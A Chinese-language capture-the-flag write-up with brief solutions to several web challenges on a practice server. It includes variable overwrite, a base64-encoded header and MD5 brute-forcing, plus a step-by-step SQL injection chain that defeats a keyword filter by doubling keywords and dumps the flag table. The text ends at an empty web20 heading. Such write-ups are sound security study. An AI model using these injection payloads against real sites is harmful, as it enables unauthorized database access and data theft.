## web1http://123.206.31.85:10001/

变量覆盖,提交a,c两个变量为空就行了,http://123.206.31.85:10001/?a=&c=  得到flag

## 流量分析.rar
直接追踪telnet的tcp流即可

## web11 http://123.206.31.85:3030/
进去页面为空,访问robots.txt就可以知道题目在shell.php.  
substr(md5(XXXX), 0, 6) = xxxx的形式,用脚本爆破md5即可,参考百度别人写的脚本.

## web13 http://123.206.31.85:10013
响应头里面有一项:  
Password:ZmxhZ3szYzAwZGFhN2VkMTIwM2MyODQ4MGY0OGZmZjc5M2E4Nn0=
base64解密即可

## Sql injection web18 http://123.206.31.85:10018
sql关键字要进行双写绕过过滤  
>查字段数 http://123.206.31.85:10018/list.php?id=1%27%20oorrder%20by%204--+   

>回显位置 http://123.206.31.85:10018/list.php?id=-1%27%20uniunionon%20seselectlect%201,2,3--+  

>查表名
http://123.206.31.85:10018/list.php?id=-1%27%20uniunionon%20seselectlect%201,group_concat(table_name),3%20from%20infoorrmation_schema.tables%20where%20table_schema=database()--+
返回有 ctf,flag两个表 

>查flag表中的字段  http://123.206.31.85:10018/list.php?id=-1%27%20uniunionon%20seselectlect%201,group_concat(column_name),3%20from%20infoorrmation_schema.columns%20where%20table_name=%27flag%27--+%20id,flag%203  

>查flag字段的值 http://123.206.31.85:10018/list.php?id=-1%27%20uniunionon%20seselectlect%201,flag,3%20from%20flag--+ 可直接得到flag


## web20 http://123.206.31.85:10020/